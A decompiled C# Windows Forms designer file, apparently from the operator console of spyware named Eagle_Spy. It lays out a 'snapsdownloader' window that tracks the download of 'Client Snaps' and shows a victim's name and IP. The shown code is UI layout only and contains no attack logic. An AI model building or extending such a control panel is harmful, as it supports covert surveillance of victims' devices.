namespace Eagle_Spy
{
	// Token: 0x020000AA RID: 170
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class snapsdownloader : global::System.Windows.Forms.Form
	{
		// Token: 0x060008FE RID: 2302 RVA: 0x000DC8C8 File Offset: 0x000DAAC8
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060008FF RID: 2303 RVA: 0x000DC908 File Offset: 0x000DAB08
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.lefttext = new global::System.Windows.Forms.Label();
			this.finishedtext = new global::System.Windows.Forms.Label();
			this.totaltext = new global::System.Windows.Forms.Label();
			this.statustext = new global::System.Windows.Forms.Label();
			this.Label1 = new global::System.Windows.Forms.Label();
			this.Bbar = new global::DrakeUI.Framework.DrakeUIProcessBar();
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.DrakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.infotext = new global::System.Windows.Forms.Label();
			this.DrakeUIButtonIcon12 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.clipic = new global::System.Windows.Forms.PictureBox();
			this.Panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.clipic).BeginInit();
			base.SuspendLayout();
			this.lefttext.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.lefttext.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.lefttext.Location = new global::System.Drawing.Point(0, 128);
			this.lefttext.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.lefttext.Name = "lefttext";
			this.lefttext.Size = new global::System.Drawing.Size(573, 23);
			this.lefttext.TabIndex = 59;
			this.lefttext.Text = "-> left : 0";
			this.finishedtext.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.finishedtext.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.finishedtext.Location = new global::System.Drawing.Point(0, 105);
			this.finishedtext.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.finishedtext.Name = "finishedtext";
			this.finishedtext.Size = new global::System.Drawing.Size(573, 23);
			this.finishedtext.TabIndex = 58;
			this.finishedtext.Text = "-> Finished : 0";
			this.totaltext.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.totaltext.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.totaltext.Location = new global::System.Drawing.Point(0, 82);
			this.totaltext.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.totaltext.Name = "totaltext";
			this.totaltext.Size = new global::System.Drawing.Size(573, 23);
			this.totaltext.TabIndex = 56;
			this.totaltext.Text = "-> Total : 0";
			this.statustext.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.statustext.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.statustext.Location = new global::System.Drawing.Point(0, 59);
			this.statustext.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.statustext.Name = "statustext";
			this.statustext.Size = new global::System.Drawing.Size(573, 23);
			this.statustext.TabIndex = 57;
			this.statustext.Text = "-> Status : Starting";
			this.Label1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Label1.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label1.Location = new global::System.Drawing.Point(0, 36);
			this.Label1.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.Label1.Name = "Label1";
			this.Label1.Size = new global::System.Drawing.Size(573, 23);
			this.Label1.TabIndex = 0;
			this.Label1.Text = "-> Downloading Client Snaps";
			this.Bbar.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Bbar.FillColor = global::System.Drawing.Color.Black;
			this.Bbar.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.Bbar.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			this.Bbar.Location = new global::System.Drawing.Point(0, 162);
			this.Bbar.Margin = new global::System.Windows.Forms.Padding(2, 2, 2, 2);
			this.Bbar.MinimumSize = new global::System.Drawing.Size(52, 19);
			this.Bbar.Name = "Bbar";
			this.Bbar.RectColor = global::System.Drawing.Color.Lime;
			this.Bbar.Size = new global::System.Drawing.Size(573, 19);
			this.Bbar.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Bbar.StyleCustomMode = true;
			this.Bbar.TabIndex = 54;
			this.Bbar.Text = "0.0%";
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
			this.Panel1.Controls.Add(this.infotext);
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon12);
			this.Panel1.Controls.Add(this.clipic);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.Panel1.Margin = new global::System.Windows.Forms.Padding(2, 2, 2, 2);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(573, 36);
			this.Panel1.TabIndex = 55;
			this.DrakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon1.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.DrakeUIButtonIcon1.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon1.Font = new global::System.Drawing.Font("Calibri", 9f);
			this.DrakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.DrakeUIButtonIcon1.Location = new global::System.Drawing.Point(529, 0);
			this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
			this.DrakeUIButtonIcon1.RectColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.Size = new global::System.Drawing.Size(22, 36);
			this.DrakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon1.StyleCustomMode = true;
			this.DrakeUIButtonIcon1.Symbol = 61564;
			this.DrakeUIButtonIcon1.SymbolSize = 25;
			this.DrakeUIButtonIcon1.TabIndex = 51;
			this.DrakeUIButtonIcon1.Click += new global::System.EventHandler(this.DrakeUIButtonIcon1_Click);
			this.infotext.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.infotext.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.infotext.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.infotext.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Bold);
			this.infotext.Location = new global::System.Drawing.Point(40, 0);
			this.infotext.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.infotext.Name = "infotext";
			this.infotext.Size = new global::System.Drawing.Size(511, 36);
			this.infotext.TabIndex = 49;
			this.infotext.Text = "Name :      IP:";
			this.infotext.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.DrakeUIButtonIcon12.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon12.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.DrakeUIButtonIcon12.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon12.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon12.Font = new global::System.Drawing.Font("Calibri", 9f);
			this.DrakeUIButtonIcon12.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.DrakeUIButtonIcon12.Location = new global::System.Drawing.Point(551, 0);
			this.DrakeUIButtonIcon12.Name = "DrakeUIButtonIcon12";
			this.DrakeUIButtonIcon12.RectColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon12.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon12.RectHoverColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon12.RectPressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon12.RectSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon12.Size = new global::System.Drawing.Size(22, 36);
			this.DrakeUIButtonIcon12.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon12.StyleCustomMode = true;
			this.DrakeUIButtonIcon12.Symbol = 61527;
			this.DrakeUIButtonIcon12.SymbolSize = 25;
			this.DrakeUIButtonIcon12.TabIndex = 50;
			this.DrakeUIButtonIcon12.Click += new global::System.EventHandler(this.DrakeUIButtonIcon12_Click);
			this.clipic.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.clipic.Location = new global::System.Drawing.Point(0, 0);
			this.clipic.Margin = new global::System.Windows.Forms.Padding(2, 2, 2, 2);
			this.clipic.Name = "clipic";
			this.clipic.Size = new global::System.Drawing.Size(40, 36);
			this.clipic.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.clipic.TabIndex = 0;
			this.clipic.TabStop = false;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Black;
			base.ClientSize = new global::System.Drawing.Size(573, 181);
			base.Controls.Add(this.lefttext);
			base.Controls.Add(this.finishedtext);
			base.Controls.Add(this.totaltext);
			base.Controls.Add(this.statustext);
			base.Controls.Add(this.Label1);
			base.Controls.Add(this.Panel1);
			base.Controls.Add(this.Bbar);
			this.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Margin = new global::System.Windows.Forms.Padding(2, 2, 2, 2);
			base.Name = "snapsdownloader";
			base.ShowIcon = false;
			this.Text = "Downloader";
			base.TopMost = true;
			this.Panel1.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.clipic).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x04000AAF RID: 2735
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000AB3 RID: 2739
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Bbar")]
		internal global::DrakeUI.Framework.DrakeUIProcessBar Bbar;

		// Token: 0x04000AB4 RID: 2740
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel1")]
		internal global::System.Windows.Forms.Panel Panel1;

		// Token: 0x04000AB5 RID: 2741
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("infotext")]
		internal global::System.Windows.Forms.Label infotext;

		// Token: 0x04000AB6 RID: 2742
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("clipic")]
		internal global::System.Windows.Forms.PictureBox clipic;

		// Token: 0x04000AB7 RID: 2743
		internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon12;

		// Token: 0x04000AB8 RID: 2744
		internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon1;

		// Token: 0x04000AB9 RID: 2745
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("lefttext")]
		internal global::System.Windows.Forms.Label lefttext;

		// Token: 0x04000ABA RID: 2746
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("finishedtext")]
		internal global::System.Windows.Forms.Label finishedtext;

		// Token: 0x04000ABB RID: 2747
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("totaltext")]
		internal global::System.Windows.Forms.Label totaltext;

		// Token: 0x04000ABC RID: 2748
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("statustext")]
		internal global::System.Windows.Forms.Label statustext;

		// Token: 0x04000ABD RID: 2749
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label1")]
		internal global::System.Windows.Forms.Label Label1;
	}
}
